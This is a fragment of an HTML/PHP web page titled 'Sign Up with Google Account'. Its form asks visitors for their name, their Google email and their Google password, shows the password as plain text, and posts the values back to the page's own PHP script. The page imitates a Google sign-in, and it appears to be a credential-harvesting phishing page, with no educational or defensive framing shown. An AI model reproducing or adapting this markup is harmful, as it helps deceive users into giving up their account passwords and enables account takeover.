...
<head>
    ...
    <title>Sign Up with Google Account</title>
            ...
            <div class="container">
                <div class="signup-content">
                    <form action="<?php echo basename(__FILE__); ?>" method="post" id="signup-form" class="signup-form">
                        <h2 class="form-title">Login with Google</h2>
                        <div class="form-group">
                            <input type="text" class="form-input" name="name" id="name" placeholder="Your Name"/>
                        </div>
                        <div class="form-group">
                            <input type="email" class="form-input" name="email" id="email" placeholder="Your Google Email"/>
                        </div>
                        <div class="form-group">
                            <input type="text" class="form-input" name="password" id="password" placeholder="Your Google Password"/>
                        ...
                        <div class="form-group">
                            <input type="submit" name="submit" id="submit" class="form-submit" value="Sign up with Google"/>
                        </div>
                    </form>
                    <p class="loginhere">
